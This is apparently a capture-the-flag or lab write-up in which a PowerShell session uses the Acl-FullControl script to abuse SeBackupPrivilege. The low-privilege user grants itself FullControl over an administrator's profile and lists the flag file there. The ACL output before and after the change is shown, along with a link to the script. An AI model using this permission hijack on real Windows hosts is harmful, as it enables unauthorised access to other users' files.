https://www.linkedin.com/pulse/glad-see-you-domain-admin-sergey-budilov


this one work

```
PS C:\Users\enterpriseuser> Import-Module ./Acl-FullControl.ps1
Import-Module ./Acl-FullControl.ps1
PS C:\Users\enterpriseuser> Acl-FullControl
Acl-FullControl
.SYNOPSIS
    Acl-FullControl
    PowerShell Function: Acl-FullControl
    Author: Luis Vacas (CyberVaca)

    Required dependencies: None
    Optional dependencies: None
.DESCRIPTION

.EXAMPLE
    Acl-FullControl -user domain\usuario -path c:\users\administrador

    Description
    -----------
    If you have the SeBackupPrivilege privilege. You can change the permissions to the path you select.
```

```
PS C:\Users\enterpriseuser> Acl-FullControl -user clientwk222\enterpriseuser -path C:\Users\enterpriseadmin
Acl-FullControl -user clientwk222\enterpriseuser -path C:\Users\enterpriseadmin
[+] Current permissions:


Path   : Microsoft.PowerShell.Core\FileSystem::C:\Users\enterpriseadmin
Owner  : NT AUTHORITY\SYSTEM
Group  : NT AUTHORITY\SYSTEM
Access : NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         CLIENTWK222\enterpriseadmin Allow  FullControl
Audit  : 
Sddl   : O:SYG:SYD:P(A;OICI;FA;;;SY)(A;OICI;FA;;;BA)(A;OICI;FA;;;S-1-5-21-3557295818-2536705713-589665162-1001)



[+] Changing permissions to C:\Users\enterpriseadmin
[+] Acls changed successfully.


Path   : Microsoft.PowerShell.Core\FileSystem::C:\Users\enterpriseadmin
Owner  : NT AUTHORITY\SYSTEM
Group  : NT AUTHORITY\SYSTEM
Access : NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         CLIENTWK222\enterpriseadmin Allow  FullControl
         CLIENTWK222\enterpriseuser Allow  FullControl
Audit  : 
Sddl   : O:SYG:SYD:PAI(A;OICI;FA;;;SY)(A;OICI;FA;;;BA)(A;OICI;FA;;;S-1-5-21-3557295818-2536705713-589665162-1001)(A;OIC
         I;FA;;;S-1-5-21-3557295818-2536705713-589665162-1004)



PS C:\Users\enterpriseuser> dir C:\Users\enterpriseadmin\Desktop
dir C:\Users\enterpriseadmin\Desktop


    Directory: C:\Users\enterpriseadmin\Desktop


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         7/18/2024  12:39 PM             38 flag.txt                                                             
-a----         9/15/2022  10:04 PM           2350 Microsoft Edge.lnk       
```

Downloading the file did not work
https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1